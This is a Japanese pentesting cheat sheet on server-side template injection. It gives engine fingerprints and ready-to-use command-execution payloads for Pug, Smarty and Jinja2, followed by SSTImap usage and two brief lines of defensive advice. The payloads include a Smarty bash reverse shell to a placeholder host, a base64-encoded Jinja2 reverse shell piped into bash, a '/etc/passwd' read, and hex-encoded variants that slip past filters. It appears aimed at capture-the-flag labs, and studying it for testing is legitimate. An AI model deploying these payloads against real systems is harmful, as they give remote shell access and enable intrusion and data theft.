# SSTI サーバー側テンプレートインジェクション

## テンプレートの判別

```
# Twig（PHP）
{{7*'7'}} -> 49

# Jinja2（Python）
{{7*'7'}} -> 7777777

# Pug/（旧称 Jade）（Node.js）
#{7*7} -> 49

＃Smarty
{'Hello'|upper} -> HELLO
```

## システムコマンド

### Pug

https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=PUG#pugjs-nodejs

javascript コードを直接実行できる

```javascript
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}

#{global.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
```

https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

```js
arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
```

### Smarty

PHP コードを直接実行できる

```PHP
{system("ls")}

{exec("/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'")}
```

### Jinja2

https://jinja.palletsprojects.com/en/stable/

Flask, Werkzeug が内部的に使用している。

```Python
# objectクラスのサブクラス一覧
{{"".__class__.__mro__[1].__subclasses__()}}

# <class '_sitebuiltins._Helper'> を使って、
# subprocess.open("ls") を実行
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["ls", "-al"])}}

# よりスマートな方法
{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjkwLjIzNS80NDQ1IDA+JjE=|base64 -d|bash').read()}}
```

```python
# ドットの使用を回避
{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("id")["read"]() }}
```

```python
# 16進エンコード
{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}
```

```sh
# 16進エンコードする簡単な方法
python3 -c 's="__init__"; print("".join(f"\\x{ord(c):02x}" for c in s))'
```

```python
# アンダースコアを回避した汎用ペイロード
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

```sh
# {{ }} が nested braces になるので、globoff が必要。
curl --globoff "http://vulnnet.thm:8080/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"
```

```python
# ブラウザのURLに入力する場合は、バックスラッシュを%5cにする必要がある
{{request|attr('application')|attr('%5cx5f%5cx5fglobals%5cx5f%5cx5f')|attr('%5cx5f%5cx5fgetitem%5cx5f%5cx5f')('%5cx5f%5cx5fbuiltins%5cx5f%5cx5f')|attr('%5cx5f%5cx5fgetitem%5cx5f%5cx5f')('%5cx5f%5cx5fimport%5cx5f%5cx5f')('os')|attr('popen')('id')|attr('read')()}}
```

```python
# Tornado?
{% import os %}{{ os.system("whoami") }}
```

## SSTImap 自動化

### インストール

```shell
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt
```

### 実行

```shell
python3 sstimap.py -X POST -u 'http://$TARGET/' -d 'page='
```

## セキュリティ

- ユーザー入力のサニタイズ
- 環境のサンドボックス化
